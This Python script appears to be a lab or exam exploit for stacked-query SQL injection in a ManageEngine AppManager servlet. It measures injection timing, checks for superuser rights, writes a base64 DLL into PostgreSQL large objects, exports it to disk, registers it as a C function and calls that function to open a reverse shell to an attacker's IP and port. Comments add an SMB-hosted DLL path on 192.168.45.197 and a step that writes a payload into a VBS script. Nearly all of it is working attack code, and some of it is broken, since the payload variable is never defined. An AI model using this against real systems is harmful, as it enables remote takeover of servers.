import requests, sys, urllib, string, random, time

requests.packages.urllib3.disable_warnings()

proxy = {
    'http': 'http://127.0.0.1:8080',  # Replace with your Burp Suite proxy address
    'https': 'http://127.0.0.1:8080'  # Replace with your Burp Suite proxy address
}


def log(msg):
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: %s" % sql[0:80])
    r = requests.get( url % sql, proxies=proxy, verify=False)
    return r

def delete_lo(url, loid):
    log("[+] Deleting existing LO...")
    sql = "SELECT lo_unlink(%d)" % loid
    make_request(url, sql)

def create_lo(url, loid):
    log("[+] Creating LO for UDF injection...")
    sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid
    #\lo_list
    make_request(url, sql)

def inject_udf(url, loid):
    log("[+] Injecting payload of length %d into LO..." % len(udf))
    for i in range(0,((len(udf)-1)/2000)+1):
        udf_chunk = udf[i*2000:(i+1)*2000]
        if i == 0:
            sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$base64$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
        else:
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d,decode($$%s$$, $$base64$$))" % (loid, i, udf_chunk)
    make_request(url, sql)

def export_udf(url, loid):
    log("[+] Exporting UDF library to filesystem...")
    sql = "SELECT lo_export(%d, $$C:\\lolo_rev_shell.dll$$)" % loid
    make_request(url, sql)

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\rev_shell.dll$$, $$awae$$ language C strict"
    #SAMBA file server
    #sql = "create or replace function rev_shell(text, integer) returns VOID as $$\\192.168.45.197\awae\rev_shell_to_nc.dll$$, $$awae$$ language C strict"
    make_request(url, sql)

def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell...")
    sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
    make_request(url, sql)

def test_sleep(url):
    log("[+] Testing the sleep for 1 seconds for sanity sake..")
    log("[+] Request > %s" % url)
    sql= "select pg_sleep(5)"
    start = time.time()
    make_request(url,sql)
    end = time.time()
    print('[+] App took %s to respond' % (start-end))


def test_is_superuser(url):
    log("[+] Testing the sleep for 1 seconds for sanity sake..")
    log("[+] Request > %s" % url)
    sql= "select case when (select current_setting($$is_superuser$$))=$$on$$ then pg_sleep(1) end"
    start = time.time()
    make_request(url,sql)
    end = time.time()
    total_time = (end-start)
    print('[+] App took %s to respond' % (start-end))
    if total_time >1:
        log("[+] Seems to be superuser with total response time of %s" % total_time)
    else:
        log("[+] Does not to be superuser with total response time of %s" % total_time)





if __name__ == '__main__':
    try:
        server = sys.argv[1].strip()
        attacker = sys.argv[2].strip()
        port = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])

sqli_url = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
#loid = 1337




test_sleep(sqli_url)
#test_is_superuser(sqli_url)
#delete_lo(sqli_url, loid)
#create_lo(sqli_url, loid)
#inject_udf(sqli_url, loid)
#export_udf(sqli_url, loid)
#create_lo(sqli_url,1337)
#export_udf(sqli_url, 1337)


#create_udf_func(sqli_url)
#trigger_udf(sqli_url, attacker, port)


#copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to
#$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
#
#
#c